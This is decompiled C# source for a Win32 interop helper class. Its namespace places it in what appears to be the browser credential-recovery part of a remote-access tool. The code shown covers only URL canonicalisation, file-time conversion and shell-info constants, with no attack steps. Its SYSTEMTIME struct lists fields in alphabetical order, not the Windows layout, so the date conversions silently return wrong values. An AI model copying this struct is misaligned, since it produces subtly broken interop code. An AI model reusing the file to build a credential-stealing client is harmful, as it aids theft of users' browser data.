using System;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;

namespace xClient.Core.Recovery.Browsers
{
	// Token: 0x020000C3 RID: 195
	public class Win32api
	{
		// Token: 0x06000510 RID: 1296
		[DllImport("shlwapi.dll")]
		public static extern int UrlCanonicalize(string pszUrl, StringBuilder pszCanonicalized, ref int pcchCanonicalized, Win32api.shlwapi_URL dwFlags);

		// Token: 0x06000511 RID: 1297 RVA: 0x000127F4 File Offset: 0x000109F4
		public static string CannonializeURL(string pszUrl, Win32api.shlwapi_URL dwFlags)
		{
			StringBuilder stringBuilder = new StringBuilder(260);
			int capacity = stringBuilder.Capacity;
			if (Win32api.UrlCanonicalize(pszUrl, stringBuilder, ref capacity, dwFlags) == 0)
			{
				return stringBuilder.ToString();
			}
			stringBuilder.Capacity = capacity;
			int num = Win32api.UrlCanonicalize(pszUrl, stringBuilder, ref capacity, dwFlags);
			return stringBuilder.ToString();
		}

		// Token: 0x06000512 RID: 1298
		[DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
		private static extern bool FileTimeToSystemTime(ref System.Runtime.InteropServices.ComTypes.FILETIME FileTime, ref Win32api.SYSTEMTIME SystemTime);

		// Token: 0x06000513 RID: 1299 RVA: 0x00012840 File Offset: 0x00010A40
		public static DateTime FileTimeToDateTime(System.Runtime.InteropServices.ComTypes.FILETIME filetime)
		{
			Win32api.SYSTEMTIME systemtime = default(Win32api.SYSTEMTIME);
			Win32api.FileTimeToSystemTime(ref filetime, ref systemtime);
			DateTime result;
			try
			{
				result = new DateTime((int)systemtime.Year, (int)systemtime.Month, (int)systemtime.Day, (int)systemtime.Hour, (int)systemtime.Minute, (int)systemtime.Second, (int)systemtime.Milliseconds);
			}
			catch (Exception)
			{
				result = DateTime.Now;
			}
			return result;
		}

		// Token: 0x06000514 RID: 1300
		[DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
		private static extern bool SystemTimeToFileTime([In] ref Win32api.SYSTEMTIME lpSystemTime, out System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime);

		// Token: 0x06000515 RID: 1301 RVA: 0x000128B4 File Offset: 0x00010AB4
		public static System.Runtime.InteropServices.ComTypes.FILETIME DateTimeToFileTime(DateTime datetime)
		{
			Win32api.SYSTEMTIME systemtime = default(Win32api.SYSTEMTIME);
			systemtime.Year = (short)datetime.Year;
			systemtime.Month = (short)datetime.Month;
			systemtime.Day = (short)datetime.Day;
			systemtime.Hour = (short)datetime.Hour;
			systemtime.Minute = (short)datetime.Minute;
			systemtime.Second = (short)datetime.Second;
			systemtime.Milliseconds = (short)datetime.Millisecond;
			System.Runtime.InteropServices.ComTypes.FILETIME result;
			Win32api.SystemTimeToFileTime(ref systemtime, out result);
			return result;
		}

		// Token: 0x06000516 RID: 1302
		[DllImport("Kernel32.dll")]
		public static extern int CompareFileTime([In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime1, [In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime2);

		// Token: 0x06000517 RID: 1303
		[DllImport("shell32.dll")]
		public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbSizeFileInfo, uint uFlags);

		// Token: 0x0400023F RID: 575
		public const uint SHGFI_ATTR_SPECIFIED = 131072U;

		// Token: 0x04000240 RID: 576
		public const uint SHGFI_ATTRIBUTES = 2048U;

		// Token: 0x04000241 RID: 577
		public const uint SHGFI_PIDL = 8U;

		// Token: 0x04000242 RID: 578
		public const uint SHGFI_DISPLAYNAME = 512U;

		// Token: 0x04000243 RID: 579
		public const uint SHGFI_USEFILEATTRIBUTES = 16U;

		// Token: 0x04000244 RID: 580
		public const uint FILE_ATTRIBUTRE_NORMAL = 16384U;

		// Token: 0x04000245 RID: 581
		public const uint SHGFI_EXETYPE = 8192U;

		// Token: 0x04000246 RID: 582
		public const uint SHGFI_SYSICONINDEX = 16384U;

		// Token: 0x04000247 RID: 583
		public const uint ILC_COLORDDB = 1U;

		// Token: 0x04000248 RID: 584
		public const uint ILC_MASK = 0U;

		// Token: 0x04000249 RID: 585
		public const uint ILD_TRANSPARENT = 1U;

		// Token: 0x0400024A RID: 586
		public const uint SHGFI_ICON = 256U;

		// Token: 0x0400024B RID: 587
		public const uint SHGFI_LARGEICON = 0U;

		// Token: 0x0400024C RID: 588
		public const uint SHGFI_SHELLICONSIZE = 4U;

		// Token: 0x0400024D RID: 589
		public const uint SHGFI_SMALLICON = 1U;

		// Token: 0x0400024E RID: 590
		public const uint SHGFI_TYPENAME = 1024U;

		// Token: 0x0400024F RID: 591
		public const uint SHGFI_ICONLOCATION = 4096U;

		// Token: 0x020000C4 RID: 196
		[Flags]
		public enum shlwapi_URL : uint
		{
			// Token: 0x04000251 RID: 593
			URL_DONT_SIMPLIFY = 134217728U,
			// Token: 0x04000252 RID: 594
			URL_ESCAPE_PERCENT = 4096U,
			// Token: 0x04000253 RID: 595
			URL_ESCAPE_SPACES_ONLY = 67108864U,
			// Token: 0x04000254 RID: 596
			URL_ESCAPE_UNSAFE = 536870912U,
			// Token: 0x04000255 RID: 597
			URL_PLUGGABLE_PROTOCOL = 1073741824U,
			// Token: 0x04000256 RID: 598
			URL_UNESCAPE = 268435456U
		}

		// Token: 0x020000C5 RID: 197
		public struct SYSTEMTIME
		{
			// Token: 0x04000257 RID: 599
			public short Day;

			// Token: 0x04000258 RID: 600
			public short DayOfWeek;

			// Token: 0x04000259 RID: 601
			public short Hour;

			// Token: 0x0400025A RID: 602
			public short Milliseconds;

			// Token: 0x0400025B RID: 603
			public short Minute;

			// Token: 0x0400025C RID: 604
			public short Month;

			// Token: 0x0400025D RID: 605
			public short Second;

			// Token: 0x0400025E RID: 606
			public short Year;
		}
	}
}
